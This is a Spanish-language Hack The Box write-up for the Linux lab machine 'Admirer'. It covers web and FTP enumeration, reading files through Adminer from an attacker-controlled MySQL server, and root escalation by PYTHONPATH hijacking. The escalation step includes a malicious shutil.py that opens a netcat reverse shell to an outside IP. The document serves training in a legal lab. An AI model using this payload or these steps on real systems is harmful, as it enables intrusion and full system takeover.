# Admirer
## 1. Introducción
### 1.1 Antecedentes
**Admirer** es una máquina Linux de dificultad <i>Easy</i> de Hack The Box, creada por **polarbearer** y **GibParadox** y publicada el 2 de mayo de 2020. El reto se centra en la enumeración web y la explotación de un panel **Adminer** mal configurado para obtener credenciales, seguido de una escalada de privilegios mediante abuso de permisos _sudo_ y carga de librerías en Python hasta obtener acceso root.
### 1.1 Objetivos
En la máquina **Admirer** de Hack The Box, los objetivos principales se enfocan en reforzar la metodología básica de compromiso en entornos Linux mediante técnicas comunes pero bien encadenadas:
- Desarrollar una **enumeración web efectiva** para descubrir archivos sensibles y credenciales.
- Explotar **servicios mal configurados (Adminer)** para obtener acceso inicial.
- Aplicar técnicas de **escalada de privilegios en Linux** hasta conseguir acceso root.
## 2. Enumeración
### 2.1 Reconocimiento inicial

Comenzamos verificando conectividad:
```bash
❯ ping -c 1 admirer.htb
```
El host responde correctamente, confirmando que está activo.
### 2.2 Nmap
Escaneo completo de puertos:
```bash
❯ nmap -p- -Pn -sS -T4 --min-rate 5000 admirer.htb -oN allports 
```
Puertos abiertos:
- 21/tcp – FTP
- 22/tcp – SSH
- 80/tcp – HTTP

Escaneo de servicios y versiones:
```bash
❯ nmap -p21,22,80 -Pn -sCV admirer.htb -oN targeted
```
Resultados relevantes:
- **FTP**: vsftpd 3.0.3
- **SSH**: OpenSSH 7.4p1 (Debian)
- **HTTP**: Apache 2.4.25
- `robots.txt` revela `/admin-dir`
### 2.3 Gobuster
Se procede a enumerar directorios en `/admin-dir`:
```bash
❯ gobuster dir -u http://admirer.htb/admin-dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o raft-small-txt-php -x php,txt

`/contacts.txt         (Status: 200) [Size: 350]`
`/credentials.txt      (Status: 200) [Size: 136]`
```
Archivos descubiertos:
- `contacts.txt`
- `credentials.txt`
Estos archivos contienen credenciales antiguas.
![[Pasted image 20260215162143.png]]
![[Pasted image 20260215162225.png]]
### 2.4 Acceso FTP
Con las credenciales encontradas se logra acceso al servicio FTP.

```bash
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
```
Archivos relevantes:

- `dump.sql`
- `html.tar.gz`

Tras extraer el contenido del sitio web se encuentra:
```
index.php  robots.txt

assets:
css  js  sass  webfonts

images:
fulls  thumbs

utility-scripts/
admin_tasks.php  db_admin.php  info.php  phptest.php

w4ld0s_s3cr3t_d1r/
contacts.txt  credentials.txt
```
En `index.php` aparecen credenciales de base de datos:
```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```
Sin embargo, estas credenciales no funcionan para SSH o FTP, por lo que se continúa con la enumeración.
### 2.5 Descubrimiento de Adminer
Se realiza fuzzing sobre `utility-scripts`:
```bash
❯ wfuzz -c --hc 403,404 -w /usr/share/wordlists/dirb/big.txt http://admirer.htb/utility-scripts/FUZZ.php

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://admirer.htb/utility-scripts/FUZZ.php
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                         
===================================================================

000001873:   200        51 L     235 W    4156 Ch     "adminer"
```
El nombre de la máquina sugiere que este servicio será clave.
## 3. Explotación
### 3.1 Abuso de Adminer (File Read vía MySQL)
Tras múltiples intentos fallidos de login, se investiga y se descubre que **Adminer permite leer archivos locales si se conecta a una base de datos controlada por el atacante**.

Estrategia:

1. Levantar un servicio MySQL en la máquina atacante.
2. Permitir que el servidor remoto se conecte.
3. Utilizar consultas SQL como `LOAD DATA` para leer archivos del sistema remoto.

Esto permite recuperar nuevas credenciales desde el archivo real del sistema:
```
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```
### 3.2 Acceso inicial
Con las nuevas credenciales:
```bash
❯ ssh waldo@admirer.htb 
waldo@admirer.htb's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
Last login: Sun May 24 20:35:48 2020 from 10.10.15.17
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
4bbd12**************************
```
Acceso exitoso como `waldo`.

Se obtiene `user.txt`.
## 4. **Post** explotación
### 4.1 Enumeración de privilegios sudo
Se enumeraron los permisos con `sudo -l`
```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
...
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Se encuentra el permiso `SETENV` 
### 4.2 Análisis del script
`admin_tasks.sh` ejecuta:
```bash
❯ admin_tasks.sh

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```
### 4.3 Abuso de PYTHONPATH
Python busca módulos en el orden definido por `PYTHONPATH`.

Si creamos un archivo `shutil.py` malicioso en un directorio controlado:
```shutil.py
import os

def make_archive(*args):
    os.system("nc -e /bin/sh 10.10.15.4 1234")
```
Y luego ejecutamos:
```bash
❯ sudo PYTHONPATH=/tmp/ /opt/scripts/admin_tasks.sh
```
Al seleccionar la opción de backup web, se ejecuta nuestro módulo malicioso como `root`.
### 4.4 Root shell
Listener en atacante:
```bash
❯ nc -lvnp 1234
```
Conexión recibida:
```bash
❯ whoami
root
```
Se obtiene acceso root y la flag final.
